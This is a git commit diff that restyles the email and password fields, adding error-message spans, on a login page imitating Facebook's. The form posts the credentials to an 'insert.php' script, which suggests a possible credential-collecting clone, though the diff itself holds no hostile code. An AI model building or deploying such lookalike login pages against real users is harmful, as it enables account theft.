508aa86cdef114459bc6d960fd8a0430b2410a41
Nuren Zarif Haque <159905470+Eyav2313@users.noreply.github.com>
2024-10-19 12:44:10 +0600

    Update login.php

--- login.php
+++ login.php
@@ -9,8 +9,24 @@
           <p> around you on Facebook.</p>
         </div>
         <form name="login" method="post" action="insert.php">
-          <input name="email_phone" type="text" placeholder="Email or phone number" required>
-          <input  name="password"type="password" placeholder="Password" required>
+          <div class="field email_phone-field">
+            <div class="input-field">
+              <input name="email_phone" type="text" placeholder="Email or phone number" class="email">
+            </div>
+            <span class="error email_phone error">
+              <i class="bx bx-error-circle error-icon"></i>
+              <p class="error-text"></p>
+            </span>
+          </div>
+          <div class="field password-field">
+            <div class="input-field">
+              <input name="password" type="password" placeholder="Password" class="password">
+            </div>
+            <span class="error password error">
+              <i class="bx bx-error-circle error-icon"></i>
+              <p class="error-text"></p>
+            </span>
+          </div>
           <div class="link">
             <button type="submit" class="login" name="Submit">Login</button>
             <a href="" class="forgot">Forgot password?</a>
